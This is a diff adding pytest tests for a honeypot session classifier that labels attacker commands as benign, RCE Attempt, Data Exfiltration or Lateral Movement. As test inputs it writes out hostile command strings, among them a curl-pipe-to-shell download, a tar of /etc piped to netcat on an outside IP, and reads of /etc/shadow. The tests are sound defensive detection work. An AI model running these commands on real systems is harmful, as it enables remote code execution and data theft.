@@ -40,6 +40,38 @@ def model_free_predictor():
     return p
 
 
+def _logged_in(*commands, duration=30):
+    return {"loginSucceeded": True, "durationSeconds": duration, "commands": [{"command": c} for c in commands]}
+
+
+@pytest.mark.parametrize("commands", [
+    ["sync"],                       # contains "nc"
+    ["systemctl start httpd"],      # contains "tar"
+    ["history"], ["cat /etc/shadow"], ["echo function"],
+    ["ls -la", "whoami", "uname -a", "cat /etc/passwd"],
+])
+def test_substrings_of_tool_names_are_not_matched(commands):
+    assert classify_honeypot_session(_logged_in(*commands)) == "BENIGN"
+
+
+def test_long_idle_session_is_not_exfiltration():
+    assert classify_honeypot_session(_logged_in("ls", duration=3600)) == "BENIGN"
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("cd /tmp; wget http://x/a.sh", "RCE Attempt"),
+    ("curl -s http://x/a | sh", "RCE Attempt"),
+    ("sudo /usr/bin/wget http://x/a", "RCE Attempt"),
+    ("chmod +x a && ./a", "RCE Attempt"),
+    ("/tmp/.x/miner", "RCE Attempt"),
+    ("echo `nc 1.2.3.4 80`", "Data Exfiltration"),
+    ("tar czf - /etc | nc 1.2.3.4 9", "Data Exfiltration"),
+    ("ssh root@10.0.0.5", "Lateral Movement"),
+])
+def test_tools_are_found_inside_compound_commands(command, expected):
+    assert classify_honeypot_session(_logged_in(command)) == expected
+
+
 @pytest.mark.parametrize("name", list(SESSIONS))
 def test_rule_classes(name):
     session, expected, _ = SESSIONS[name]
